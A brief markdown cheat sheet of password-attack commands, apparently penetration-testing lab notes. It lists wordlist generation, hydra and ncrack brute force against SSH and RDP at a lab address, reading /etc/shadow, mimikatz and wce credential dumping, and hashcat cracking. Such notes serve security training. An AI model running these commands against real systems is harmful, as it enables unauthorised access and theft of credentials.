# Passwords

### Wordlists
 * /usr/share/seclists/Passwords/
 * /usr/share/seclists/Passwords/Leaked-Databases/
 * crunch 4 8 -o wordlist.txt -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space-sv **(91 PB - don't do this)**
 * cewl https://www.canada.ca/en.html -m 6 -w wordlist.txt
 * john --rules --wordlist=wordlist.txt --stdout > wordlist2.txt *(Mutates passwords according to rules in /etc/john/john.conf)*
 * cupp -w wordlist.txt *(follwed by interactive prompts for options, saves as wordlist.txt.cupp.txt)*

### Online Attacks
 * Use ncrack for RDP `ncrack -vv --user Administrator -P passwordlist.txt rdp://10.11.1.35`
 * `hydra -l root -P passwordlist.txt 10.11.1.35 ssh`

### Dump Linux Hashes
 * /etc/shadow
 * unshadow passwd shadow

### Dump Windows Hashes and Passwords
 * fgdump.exe
 * wce32.exe -w
 * mimikatz.exe
    * token::elevate
    * sekurlsa::logonpasswords

### Offline Attacks
 * hash-identifier to determine mystery hash type
 * findmyhash
 * Google, https://crackstation.net/, https://hashkiller.co.uk/, https://hashes.org/
 * hashcat -m`mode` `hashfile` `wordlist` *Note: wordlist can use wildcards*
 * hashcat --help | findstr /i wordpress *(or grep -i wordpress)*